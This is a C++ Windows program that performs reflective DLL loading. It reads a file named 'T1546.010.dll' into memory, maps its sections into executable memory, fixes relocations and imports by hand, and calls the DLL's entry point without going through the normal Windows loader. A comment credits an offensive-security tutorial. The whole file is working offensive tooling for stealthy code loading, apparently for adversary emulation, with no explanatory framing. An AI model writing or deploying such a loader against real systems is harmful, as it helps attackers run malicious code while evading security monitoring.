#include <Windows.h>
#include <iostream>

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

using DLLEntry = BOOL(WINAPI*)(HINSTANCE dll, DWORD reason, LPVOID reserved);

int main(int argc, char* argv[])
{
	DWORD processId = GetCurrentProcessId();
	HANDLE hProcess{ nullptr }; // Handle to the target process
	LPVOID dllBytes{ nullptr };



	// Attempt to attach to the process
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
	if (hProcess == NULL) {
		std::cout << "Failed to attach to the process. Error code: " << GetLastError() << std::endl;
		return 1;
	}

	// Process attached successfully
	std::cout << "Attached to the process successfully!" << std::endl;

	// load DLL into memory
	HANDLE dll = CreateFileA("T1546.010.dll", GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	if (dll == INVALID_HANDLE_VALUE) {
		std::cout << "Failed to open the DLL file. Error code: " << GetLastError() << std::endl;
		CloseHandle(hProcess);
		return 1;
	}
	// Get the size of the DLL file
	DWORD dllSize = GetFileSize(dll, NULL);
	if (dllSize == INVALID_FILE_SIZE) {
		std::cout << "Failed to get the DLL file size. Error code: " << GetLastError() << std::endl;
		CloseHandle(dll);
		CloseHandle(hProcess);
		return 1;
	}

	std::cout << "The file size is : " << dllSize << std::endl;
	
	// Allocate memory in the local process	
	dllBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllSize);
	if (dllBytes == NULL) {
		std::cout << "Failed to allocate memory in the local process. Error code: " << GetLastError() << std::endl;
		CloseHandle(dll);
		CloseHandle(hProcess);
		return 1;
	}

	// Read the DLL binary into the local buffer	
	DWORD bytesRead = 0;
	if (!ReadFile(dll, dllBytes, dllSize, &bytesRead, NULL) || bytesRead != dllSize) {
		std::cout << "Failed to read the DLL file. Error code: " << GetLastError() << std::endl;
		HeapFree(GetProcessHeap(), 0, dllBytes);
		CloseHandle(dll);
		CloseHandle(hProcess);
		return 1;
	}

	// get pointers to in-memory DLL headers  
	// ( code from "https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection")
	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)dllBytes;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders->e_lfanew);
	SIZE_T dllImageSize = ntHeaders->OptionalHeader.SizeOfImage;

	LPVOID dllBase = VirtualAlloc((LPVOID)ntHeaders->OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;

	// Write the DLL binary into the allocated memory in the target process
	if (WriteProcessMemory(hProcess, dllBase, dllBytes, dllSize, NULL) == 0) {
		std::cout << "Failed to write DLL binary into process memory. Error code: " << GetLastError() << std::endl;
		HeapFree(GetProcessHeap(), 0, dllBytes);
		VirtualFreeEx(hProcess, dllBase, 0, MEM_RELEASE);
		CloseHandle(dll);
		CloseHandle(hProcess);
		return 1;
	}

	// copy over DLL image sections to the newly allocated space for the DLL
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
	for (size_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
	{
		LPVOID sectionDestination = (LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)section->VirtualAddress);
		LPVOID sectionBytes = (LPVOID)((DWORD_PTR)dllBytes + (DWORD_PTR)section->PointerToRawData);
		std::memcpy(sectionDestination, sectionBytes, section->SizeOfRawData);
		section++;
	}

	// perform image base relocations
	IMAGE_DATA_DIRECTORY relocations = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)dllBase;
	DWORD relocationsProcessed = 0;

	while (relocationsProcessed < relocations.Size)
	{
		PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
		relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
		DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
		PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);

		for (DWORD i = 0; i < relocationsCount; i++)
		{
			relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);

			if (relocationEntries[i].Type == 0)
			{
				continue;
			}

			DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
			DWORD_PTR addressToPatch = 0;
			ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR), NULL);
			addressToPatch += deltaImageBase;
			std::memcpy((PVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR));
		}
	}

	// resolve import address table
	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
	IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dllBase);
	LPCSTR libraryName = "";
	HMODULE library = NULL;

	while (importDescriptor->Name != NULL)
	{
		libraryName = (LPCSTR)importDescriptor->Name + (DWORD_PTR)dllBase;
		library = LoadLibraryA(libraryName);

		if (library)
		{
			PIMAGE_THUNK_DATA thunk = NULL;
			thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDescriptor->FirstThunk);

			while (thunk->u1.AddressOfData != NULL)
			{
				if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
				{
					LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
					thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);
				}
				else
				{
					PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk->u1.AddressOfData);
					DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, functionName->Name);
					thunk->u1.Function = functionAddress;
				}
				++thunk;
			}
		}

		importDescriptor++;
	}


	// DLL loaded successfully
	std::cout << "DLL loaded into process memory successfully!" << std::endl;

	// execute the loaded DLL
	DLLEntry DllEntry = (DLLEntry)((DWORD_PTR)dllBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
	(*DllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);


	HeapFree(GetProcessHeap(), 0, dllBytes);
	VirtualFreeEx(hProcess, dllBase, 0, MEM_RELEASE);
	CloseHandle(dll);
	CloseHandle(hProcess);

	return 0;
}
